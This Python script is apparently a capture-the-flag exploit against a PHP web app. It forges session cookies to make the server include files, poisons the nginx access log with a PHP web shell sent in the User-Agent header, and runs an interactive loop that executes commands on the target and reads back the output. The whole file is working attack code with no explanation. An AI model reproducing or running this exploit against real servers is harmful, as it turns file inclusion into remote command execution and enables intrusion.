import requests
import os
import base64
from pwn import *

#TARGET_URL = 'http://127.0.0.1:1337'
TARGET_URL = 'http://188.166.169.77:31435'
def getFileCookie(f):
    cookie = os.popen('php file.php -f'+f).read()
    return cookie


def execCommand(cmd,filename):
    data = open('reverse_shell.php').read()
    data = data.encode("ascii")
    data = base64.b64encode(data)
    data = data.decode("ascii")
    fcookie = getFileCookie('/var/log/nginx/access.log')
    payload = "<?php $cmd=shell_exec($_GET['cmd']); echo($cmd); $file='/tmp/{filename}'; file_put_contents($file,$cmd); ?>".format(
        filename=filename, data=data)
    headers = {"Cookie": "PHPSESSID={fcookie}".format(fcookie=fcookie),
               "User-Agent": payload}
    res_payload = requests.get(TARGET_URL+'/?cmd='+cmd, headers=headers)
    #print(res_payload.text)
    payload = "<?php $cmd=shell_exec($_GET['cmd']); echo($cmd); $file='/tmp/{filename}'; file_put_contents($file,$cmd); ?>".format(
        filename=filename, data=data)
    headers = {"Cookie": "PHPSESSID={fcookie}".format(fcookie=fcookie)}
    res_exec = requests.get(TARGET_URL+'/?cmd='+cmd, headers=headers)
    #print(res_exec.text)



def openFile(filename):
    fcookie=getFileCookie('/tmp/{filename}'.format(filename=filename))
    headers = {"Cookie": "PHPSESSID={fcookie}".format(fcookie=fcookie)}

    res=requests.get(TARGET_URL, headers=headers)
    print(res.text,end='')

def hack():
    while True:
        print('$',end='')
        cmd=input()
        execCommand(cmd,'navy.php')
        openFile('navy.php')


hack()